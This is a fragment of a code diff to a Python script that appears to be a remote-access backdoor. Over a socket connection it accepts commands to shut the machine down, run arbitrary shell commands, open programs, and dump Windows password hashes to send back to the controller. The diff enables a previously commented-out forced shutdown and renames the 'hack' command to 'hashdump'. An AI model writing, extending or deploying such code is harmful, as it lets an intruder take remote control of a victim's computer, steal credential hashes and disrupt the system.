@@ -34,7 +34,7 @@ while (True):
         print('Shutting Down')
         #send confirmation
         s.sendall(bytes("shutting down","utf-8"))
-        # os.system("shutdown /s /t 1")
+        os.system("shutdown /s /t 1")
         # The command shuts down the pc so avoid running it
     elif decodedMsg == "openCalc":
         os.system('cmd /c "calc"')
@@ -54,7 +54,7 @@ while (True):
         subprocess.call(cmdline, cwd=dir, shell=True) # run `cmdline` in `dir`
         s.sendall(bytes("done", "utf-8"))
     # dump the hashes and send them via the connection
-    elif decodedMsg == "hack":
+    elif decodedMsg == "hashdump":
         dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Downloads"
         systemN = ""
         securityN = ""
